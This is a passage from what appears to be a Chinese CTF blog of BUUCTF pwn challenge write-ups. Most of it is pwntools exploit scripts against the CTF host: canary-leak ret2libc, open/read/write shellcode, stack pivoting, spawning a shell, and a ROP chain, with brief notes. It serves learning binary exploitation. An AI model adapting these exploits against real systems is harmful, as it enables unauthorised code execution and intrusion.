class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/37&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25862</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/37&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc64.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">fmt = <span class="string">&#x27;%11$p&#x27;</span></span><br><span class="line">c.sendline(fmt)</span><br><span class="line">c.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(c.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret =<span class="number">0x00400993</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x04005f9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>) +p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">fmt = <span class="string">&#x27;%11$p&#x27;</span></span><br><span class="line">c.sendline(fmt)</span><br><span class="line">c.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(c.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)+ p64(pop_rdi_ret) + p64(bin_sh)+p64(system_addr) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x26-pwnable-orw"><a href="#0x26-pwnable-orw" class="headerlink" title="0x26.pwnable_orw"></a>0x26.pwnable_orw</h2><p><code>orw</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.2at0igwhvwhs.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/38&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25575</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eax  调用号</span></span><br><span class="line"><span class="comment"># ebx ecx edx  参数 </span></span><br><span class="line"><span class="comment"># open(flag,0,0) </span></span><br><span class="line">open_shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">push 0x0;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0x5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"><span class="comment"># read(fd,flag,0x100)</span></span><br><span class="line">read_shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx,0x100;</span></span><br><span class="line"><span class="string">mov ecx,ebx;</span></span><br><span class="line"><span class="string">mov ebx,0x3;</span></span><br><span class="line"><span class="string">mov eax,0x3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># write(1,flag,0x100)</span></span><br><span class="line">write_shell = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov ebx,0x1;</span></span><br><span class="line"><span class="string">mov eax,0x4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(open_shell)+asm(read_shell)+asm(write_shell)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">------------------------shellcraft</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考博文：<a class="link" href="https://niceseven.github.io/post/2020/10/29/buuctf-pwn-pwnable_orw/">BUUCTF Pwn Pwnable_orw | NiceSeven’s Website<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x27-bjdctf-2020-router"><a href="#0x27-bjdctf-2020-router" class="headerlink" title="0x27.bjdctf_2020_router"></a>0x27.bjdctf_2020_router</h2><p><code>trick</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.27n3aga49w00.webp"></p><p>不需要 payload 的一道题。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.4m7dmr3mnxmo.webp"></p><h2 id="0x28-Black-Watch-入群题-PWN"><a href="#0x28-Black-Watch-入群题-PWN" class="headerlink" title="0x28.[Black Watch 入群题]PWN"></a>0x28.[Black Watch 入群题]PWN</h2><p>​    想简单了</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.6zider3e6um8.webp"></p><p>​    目前思路是<code>栈迁移--&gt;修改权限--&gt;执行</code></p><p>​    但是这道题是动态链接，没有<code>mprotect函数</code>，如果要利用就得计算偏移后再调用它，这样还不如直接利用<code>system函数</code>。</p><p>​    故：<code>栈迁移--&gt;泄露偏移--&gt;/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28201</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/40&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x8048513</span></span><br><span class="line">s=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048408</span></span><br><span class="line"></span><br><span class="line">payload=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(s-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=p32(system)+p32(<span class="number">0</span>)+p32(sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/40&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26199</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/40&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+ <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x29-mrctf2020-shellcode"><a href="#0x29-mrctf2020-shellcode" class="headerlink" title="0x29.mrctf2020_shellcode"></a>0x29.mrctf2020_shellcode</h2><p><code>un-decompile </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -410h</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line"># 这两行是函数开始的标准指令，将当前栈底地址保存在 rbp 中，以便在函数执行过程中可以访问函数参数和局部变量。</span><br><span class="line">sub     rsp, 410h</span><br><span class="line"># 在栈上分配了 0x410（1040）字节的空间，用于存储函数中的局部变量。</span><br><span class="line">mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stderr@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line"># setbuf相关，感觉不用管</span><br><span class="line">lea     rdi, s          ; &quot;Show me your magic!&quot;</span><br><span class="line">call    _puts</span><br><span class="line"># 这两行代码调用puts函数打印了 &quot;Show me your magic!&quot; 这个字符串。</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 400h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line"># 调用read函数，将标准输入存在buf处，大小最大为0x400</span><br><span class="line">mov     [rbp+var_4], eax</span><br><span class="line">cmp     [rbp+var_4], 0</span><br><span class="line">jg      short loc_11D6</span><br><span class="line"># 这几行代码将读取到的数据长度存储在 var_4 变量中，并检查该长度是否大于零。如果长度为零或负数，那么程序就直接退出。如果长度为正数，则继续执行loc_11D6处代码。</span><br><span class="line">loc_11D6:</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">call    rax</span><br><span class="line">mov     eax, 0</span><br><span class="line"># 这两行代码调用 buf 指向的函数并退出程序</span><br></pre></td></tr></table></figure><p>其实这道题我也没有先分析，而是先试了一下，猜了一下就直接getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29142</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Show me your magic!\n&#x27;</span>)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2a-picoctf-2018-buffer-overflow-1"><a href="#0x2a-picoctf-2018-buffer-overflow-1" class="headerlink" title="0x2a.picoctf_2018_buffer overflow 1"></a>0x2a.picoctf_2018_buffer overflow 1</h2><p><code>ret2text</code>  ……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25739</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">vul = <span class="number">0x080485CB</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please enter your string: \n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x04</span>) + p32(vul)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2b-jarvisoj-test-your-memory"><a href="#0x2b-jarvisoj-test-your-memory" class="headerlink" title="0x2b.jarvisoj_test_your_memory"></a>0x2b.jarvisoj_test_your_memory</h2><p><code>ret2libc1</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.1bdieyh678dc.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230308/%E5%9B%BE%E7%89%87.1ov8fvmjefs0.webp"></p><p>​    我目前的猜测就是程序停留在这里，然后flag在缓冲区之类的地方，输出不了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/45&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25317</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;/mnt/hgfs/0_虚拟机共享文件夹/&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">cat_flag = <span class="number">0x080487E0</span></span><br><span class="line">system_plt = <span class="number">0x08048440</span></span><br><span class="line">win_addr = <span class="number">0x080485BD</span></span><br><span class="line">leave_ret =<span class="number">0x08048528</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x13</span>+<span class="number">0x4</span>)+ p32(win_addr) + p32(leave_ret) +p32(cat_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2c-inndy-rop"><a href="#0x2c-inndy-rop" class="headerlink" title="0x2c.inndy_rop"></a>0x2c.inndy_rop</h2><p><code>静态编译，ret2libc3</code></p><p><mark>注意：</mark></p><p><code>from struct import pack</code></p><p><code>ROPgadget --binary 46 --ropchain</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">c =remote(&#x27;node4.buuoj.cn&#x27;,25756)</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line"></span><br><span class="line">p = b&#x27;a&#x27; * (0xc+0x4)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov 